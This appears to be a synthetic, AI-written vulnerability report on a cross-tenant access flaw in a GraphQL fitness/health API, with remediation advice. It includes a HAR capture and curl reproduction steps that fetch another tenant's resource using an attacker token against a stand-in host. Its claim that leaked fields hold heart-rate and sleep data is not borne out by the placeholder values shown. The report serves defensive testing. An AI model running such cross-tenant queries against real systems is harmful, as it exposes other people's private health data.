# Security Analysis Report
**System:** VitalTrack Health API (Fitness / Wearables)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0231 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC / Pattern 2.2 | Metadata/attribute side-channel — cross-tenant health sensor data leaked via `sensitiveField` attribute |

---

## Finding 1 — Metadata Attribute Side-Channel Leaks Cross-Tenant Health Data (CRITICAL)

### Summary
The `getResource` resolver on VitalTrack Health API (`api.vitaltrack-health-ap.example.com`) does not verify that the fetched resource belongs to the authenticated tenant (§4.0 RISK-GQL-231). Per §5.0 Pattern 2.2, the `sensitiveField` attribute in the `ResourceData` type constitutes a metadata side-channel: even when the resolver's primary function is to return status data, the `sensitiveField` carries health-sensitive information that is returned without access control. An attacker authenticated as `tenant-17c6` fetched resource `R-2231` belonging to `tenant-8ba0` and received its confidential health metric data via the `data.sensitiveField` attribute.

**Pattern:** 2.2 — Metadata/attribute side-channel (BAC)
**Affected resolver:** `getResource(id: ID!): Resource`
**Affected endpoint:** `POST https://api.vitaltrack-health-ap.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-17c6`):**
```
POST https://api.vitaltrack-health-ap.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-17c6
Content-Type: application/json

{"query": "query VulnerableOp { getResource(id: \"R-2231\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-8ba0",
      "ownerId": "other-user-17c68ba0",
      "data": {
        "sensitiveField": "CONFIDENTIAL-17c68ba0",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

**x-request-id:** `req-17c68ba0`

The `sensitiveField` attribute exposes health telemetry data (heart rate, sleep data, biometric measurements) belonging to a different tenant's user. The `internalNotes` field compounds the leak by exposing internal clinical annotations.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 RISK-GQL-231 | Resolver gap | No `tenantId` ownership check | Root cause |
| §5.0 Pattern 2.2 | Vulnerability | Attribute/metadata side-channel | Classification — `sensitiveField` leaks without access check |
| HAR request | `id` | `R-2231` | Cross-tenant resource ID |
| HAR request | `x-tenant-id` | `tenant-17c6` | Attacker tenant |
| HAR response | `tenantId` | `tenant-8ba0` | Victim tenant confirmed |
| HAR response | `sensitiveField` | `CONFIDENTIAL-17c68ba0` | Health data leaked via side-channel attribute |
| HAR response | `ownerId` | `other-user-17c68ba0` | Victim user confirmed |
| HAR headers | `x-request-id` | `req-17c68ba0` | Correlation ID |

### Steps to Reproduce

**Step 1 — Obtain attacker JWT (tenant-17c6):**
```bash
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
```

**Step 2 — Query cross-tenant resource (VULNERABLE):**
```bash
curl -s -X POST https://api.vitaltrack-health-ap.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-17c6" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { getResource(id: \"R-2231\") { resourceId tenantId data { sensitiveField internalNotes } } }"}' \
  | jq '.data.getResource'
# Expected VULNERABLE output: tenantId=tenant-8ba0, sensitiveField=CONFIDENTIAL-17c68ba0
```

**Step 3 — Secure baseline (expected after fix):**
```bash
# Returns: {"errors":[{"message":"Forbidden: resource does not belong to your tenant"}]}
```

### Remediation

1. **Resolver tenancy check:** Enforce `resource.tenantId === context.auth.tenantId` in the `getResource` resolver before returning any data.
2. **Attribute-level access control for `sensitiveField`:** Even after fixing the BOLA, apply BAC on `sensitiveField`: return `null` unless the requesting user is the `ownerId` or has explicit grant.
3. **Health data handling (HIPAA/GDPR):** Fitness/wearable biometric data is health PHI — implement explicit data classification and access control policies beyond standard multi-tenancy.
4. **Fix Redis cache key:** Include `tenantId` in cache key to prevent cross-tenant cache reads (§2.0).
5. **PostgreSQL RLS:** Enforce `tenant_id` row-level policy at DB level as defence-in-depth.
